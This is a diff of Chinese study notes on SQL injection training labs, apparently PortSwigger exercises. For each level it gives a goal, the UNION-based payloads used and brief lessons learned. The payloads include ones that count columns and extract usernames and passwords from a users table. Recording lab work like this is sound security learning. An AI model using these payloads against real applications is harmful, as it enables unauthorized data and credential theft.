@@ -53,20 +53,38 @@
 2.--注释符，#也可以，但是它在URL编码中会出问题
 3.总的来说套路一致：首先现用单引号闭合，测数据库中表的列数，查想要的数据，最后注释
 
-##关卡四：SQL injection UNION attack, retrieving data from other tables（联合注入）
+##关卡五：SQL injection UNION attack, retrieving data from other tables（联合注入）
 **目标**：拿到管理员用户名，密码
-**攻击Payload**:'+UNION+SELECT+'abc','def'--
-                '+UNION+SELECT+username,+password+FROM+users--
+**攻击Payload**:1.'+UNION+SELECT+'abc','def'--
+                2.'+UNION+SELECT+username,+password+FROM+users--
+                3.查看网页中administrator以及这个参数下面包含的字符串也就是密码
 **思考与总结**：采用数字注入报错，题目要求username,password属于字符串类型
                FROM查什么地方的表
 
-##关卡五：SQL injection UNION attack, finding a column containing text（查包含文本的列）
+##关卡六：SQL injection UNION attack, finding a column containing text（查包含文本的列）
 **目标**：让字符串出现在查询结果里
 **攻击Payload**:1.'+UNION+SELECT+NULL,NULL,NULL--
                 2.'+UNION+SELECT+'abcdef',NULL,NULL--(官方答案)
 **实际**：1.采用ORDER BY 1 -- -【查看有几列】尝试到4时报错，证明一共3列
           2.' UNION SELECT 1,2,3-- -报错，数字行不通
           3.使用'+UNION+SELECT+NULL,NULL,NULL--和'+UNION+SELECT+'abcdef',NULL,NULL--
+          4.'+UNION+SELECT+'abcdef',NULL,NULL--在第一位报错证明回显位不在第一位，换到第二位，成功找到字符串，复制放到第二回显位
+
+##关卡七：SQL injection UNION attack, determining the number of columns returned by the query（测数列）
+**目标**：察看数据库列数
+**攻击payload**:1.' ORDER BY 1 -- -使用这一条看看有多少回显位（到3一共三个回显位）
+                2.' UNION SELECT NULL,NULL,NULL -- -
+                
+##关卡八：SQL injection UNION attack, retrieving multiple values in a single column（强制拼接）
+**目标**：在只有一个回显位的情况下，拿到管理员用户名，密码
+**攻击payload**:1.'+UNION+SELECT+NULL,'abc'--
+                2.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--【挤挤】
+**原理**：||Oracle,PostgreSQL字符串拼接符【强力520】
+          CONCAT（）:MYSQL专用
+          GROUP_CONCAT:将查出来的数据揉成一行
+
+##总结：在只有一个回显位可用时需要将多个拼接为一个【挤挤总能放的下】
+
 
 
 
